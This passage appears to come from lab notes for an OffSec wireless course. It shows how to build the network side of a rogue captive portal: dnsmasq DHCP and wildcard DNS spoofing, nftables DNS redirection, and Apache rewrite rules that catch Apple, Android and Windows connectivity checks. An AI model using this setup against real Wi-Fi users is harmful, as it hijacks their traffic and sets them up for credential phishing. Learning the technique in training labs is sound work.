In order for this attack to work, we will need to do a bit of configuration.

We will first assign an IP address to our `wlan0` interface. We'll use `192.168.87.1` with a network mask of `255.255.255.0`. The IP we use doesn't matter because once the user's system detects that it can't reach the Internet, it will automatically open the IP address of the router in the browser, which is also the host of the captive portal.

```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[16Apr2025 20:34:24]-[/home/kali/SUT/OSWP/www.megacorpone.com]
â””â”€# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.163  netmask 255.255.255.0  broadcast 192.168.1.255
        ether 00:0c:29:af:f3:43  txqueuelen 1000  (Ethernet)
        RX packets 13885  bytes 6609826 (6.3 MiB)
        RX errors 0  dropped 1  overruns 0  frame 0
        TX packets 11700  bytes 1028412 (1004.3 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 71154  bytes 6167748 (5.8 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 71154  bytes 6167748 (5.8 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 192.168.87.1  netmask 255.255.255.0  broadcast 0.0.0.0
        ether 82:99:99:34:40:ab  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
                 
â”Œâ”€â”€(rootðŸ’€gobots)-[16Apr2025 20:34:27]-[/home/kali/SUT/OSWP/www.megacorpone.com]
â””â”€# sudo ip link set wlan0 up
```

We will have clients connecting to us, and in order for them to reach our captive portal, they need an IP configuration. Thankfully, the first thing the user will do is request a Dynamic Host Configuration ProtocolÂ lease. We will provide that usingÂ `dnsmasq`,Â a small DNS/DHCP server. We can install dnsmasq withÂ apt.

We will use the followingÂ `mco-dnsmasq.conf`Â configuration file for DHCP.

```
# Main options
# http://www.thekelleys.org.uk/dnsmasq/docs/dnsmasq-man.html
domain-needed
bogus-priv
no-resolv
filterwin2k
expand-hosts
domain=localdomain
local=/localdomain/
# Only listen on this address. When specifying an
# interface, it also listens on localhost.
# We don't want to interrupt any local resolution
# since the DNS responses will be spoofed
listen-address=192.168.87.1

# DHCP range
dhcp-range=192.168.87.100,192.168.87.199,12h
dhcp-lease-max=100
```

We also need to doÂ `DNS spoofing`Â so that the response for most DNS requests will point back to us with the exception of rare cases. We'll use `dnsmasq` again. To do this, we will append the following to the configuration file we just created.

```bash
# This should cover most queries
# We can add 'log-queries' to log DNS queries
address=/com/192.168.87.1
address=/org/192.168.87.1
address=/net/192.168.87.1

# Entries for Windows 7 and 10 captive portal detection
address=/dns.msftncsi.com/131.107.255.255
```

Although we are only spoofing a few generic top-level domains (gTLD), .com, .net, and .org, this should cover most of the website domains a connected user will attempt to access.
For Windows, we have to resolveÂ dns.msftncsi.comÂ to a specific IP address that Windows knows the result of. This will help Windows detect the captive portal.

Now that the configuration file is complete, let's startÂ dnsmasqÂ withÂ --conf-fileÂ followed by the path of our configuration file.

```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[16Apr2025 20:43:32]-[/home/kali/SUT/OSWP/www.megacorpone.com]
â””â”€# sudo dnsmasq --conf-file=mco-dnsmasq.conf
```
After startup, dnsmasq will create a file containing its process ID inÂ `/var/run/dnsmasq.pid`. This will let us find and kill the process when we are done. We can inspectÂ  `syslog` to confirm it started successfully.

```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[16Apr2025 22:36:52]-[/home/kali/SUT/OSWP/www.megacorpone.com]
â””â”€# sudo tail /var/log/syslog | grep dnsmasq
2025-04-16T22:36:52.165425+00:00 gobots dnsmasq[602939]: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset nftset auth DNSSEC loop-detect inotify dumpfile
2025-04-16T22:36:52.165462+00:00 gobots dnsmasq[602939]: warning: no upstream servers configured
2025-04-16T22:36:52.165485+00:00 gobots dnsmasq-dhcp[602939]: DHCP, IP range 192.168.87.100 -- 192.168.87.199, lease time 12h
2025-04-16T22:36:52.165506+00:00 gobots dnsmasq[602939]: using only locally-known addresses for localdomain
2025-04-16T22:36:52.165528+00:00 gobots dnsmasq[602939]: read /etc/hosts - 99 names
```

UsingÂ netstat, we can confirm it is listening on port 53 (TCP/UDP) for DNS, and on 67 (UDP) for DHCP.

```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[16Apr2025 22:38:02]-[/home/kali/SUT/OSWP/www.megacorpone.com]
â””â”€# sudo netstat -lnp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:53              0.0.0.0:*               LISTEN      602939/dnsmasq      
tcp6       0      0 :::53                   :::*                    LISTEN      602939/dnsmasq      
udp        0      0 0.0.0.0:53              0.0.0.0:*                           602939/dnsmasq      
udp        0      0 0.0.0.0:67              0.0.0.0:*                           602939/dnsmasq      
udp6       0      0 :::53                   :::*                                602939/dnsmasq      
```

Although port 67 (UDP) is open, it is listening on 0.0.0.0 (all IP addresses), even though we specifically configured it to listen on a specific IP in Listing 11 with theÂ _listen-address_Â parameter. This appears to be a bug.

DHCP is a broadcast protocol, and clients send broadcast frames to get any potential listening DHCP server to give them a lease. For that reason, dnsmasq isn't listening on a specific IP address but a broadcast address. Although it is listening on 0.0.0.0, it will only listen to broadcast traffic on the interface we specified. Note that netstat won't display that information. The same goes for DNS (port 53 TCP/UDP).

Sometimes clients ignore DNS settings provided in the DHCP lease, and we will use anÂ _nftables_[5](https://portal.offsec.com/courses/pen-210-9545/learning/attacking-captive-portals-15795/the-captive-portal-attack-15859/networking-setup-16080#fn-local_id_7-5)Â rule to force redirect all DNS requests (UDP to port 53 only--TCP port 53 is forÂ _zone transfer_[6](https://portal.offsec.com/courses/pen-210-9545/learning/attacking-captive-portals-15795/the-captive-portal-attack-15859/networking-setup-16080#fn-local_id_7-6)) back to our server.

To do this, we need to install nftables and then add the rules.

```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[16Apr2025 22:40:45]-[/home/kali/SUT/OSWP/www.megacorpone.com]
â””â”€# sudo nft add table ip nat

â”Œâ”€â”€(rootðŸ’€gobots)-[16Apr2025 22:42:49]-[/home/kali/SUT/OSWP/www.megacorpone.com]
â””â”€# sudo nft 'add chain nat PREROUTING { type nat hook prerouting priority dstnat; policy accept; }'
          
â”Œâ”€â”€(rootðŸ’€gobots)-[16Apr2025 22:42:57]-[/home/kali/SUT/OSWP/www.megacorpone.com]
â””â”€# sudo nft add rule ip nat PREROUTING iifname "wlan0" udp dport 53 counter redirect to :53
```

In Apache's site configuration, we need to addÂ `mod_rewrite`Â andÂ `mod_alias`Â rules so that the captive portal is set properly. We'll add the following lines inÂ `/etc/apache2/sites-enabled/000-default.conf`Â before theÂ `VirtualHost`Â closing tag.


```bash
...

  # Apple
  RewriteEngine on
  RewriteCond %{HTTP_USER_AGENT} ^CaptiveNetworkSupport(.*)$ [NC]
  RewriteCond %{HTTP_HOST} !^192.168.87.1$
  RewriteRule ^(.*)$ http://192.168.87.1/portal/index.php [L,R=302]

  # Android
  RedirectMatch 302 /generate_204 http://192.168.87.1/portal/index.php

  # Windows 7 and 10
  RedirectMatch 302 /ncsi.txt http://192.168.87.1/portal/index.php
  RedirectMatch 302 /connecttest.txt http://192.168.87.1/portal/index.php

  # Catch-all rule to redirect other possible attempts
  RewriteCond %{REQUEST_URI} !^/portal/ [NC]
  RewriteRule ^(.*)$ http://192.168.87.1/portal/index.php [L]

</VirtualHost>
```

These additions will require two modules to be enabled. For the first four and the last three instructions, we need theÂ `redirect_Â module`. For the two `"RedirectMatch"` additions in-between, we need theÂ `alias`Â module.

Let's enable them usingÂ a2enmod.

```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[16Apr2025 22:51:52]-[/home/kali/SUT/OSWP/www.megacorpone.com]
â””â”€# a2enmod rewrite
Module rewrite already enabled
               
â”Œâ”€â”€(rootðŸ’€gobots)-[16Apr2025 22:51:59]-[/home/kali/SUT/OSWP/www.megacorpone.com]
â””â”€# systemctl restart apache2                                                               
        
â”Œâ”€â”€(rootðŸ’€gobots)-[16Apr2025 22:52:27]-[/home/kali/SUT/OSWP/www.megacorpone.com]
â””â”€# a2enmod alias  
Module alias already enabled
 
```

Apache has a number of small utilities that allow us to enable and disable modules. We could manually create and delete symlinks in specific directories, but these utilities have auto-completion for the respective items they are dealing with.

The naming convention of the utilities makes them relatively easy to read. Each one starts with `"a2"`, which stands for Apache2. It is followed by `"en" or "dis"`, to indicate enabled and disabled. The last part indicates what is to be enabled or disabled, and it can be `"mod", "site", or "conf"`, which stand for module, site, or configuration, respectively. For example, if we wanted to disable a module, we would be usingÂ `a2dismod`.

Let's start (or restart) Apache usingÂ systemctl restart apache2Â and then make sure the portal is correctly displayed locally by pointing a browser to 127.0.0.1.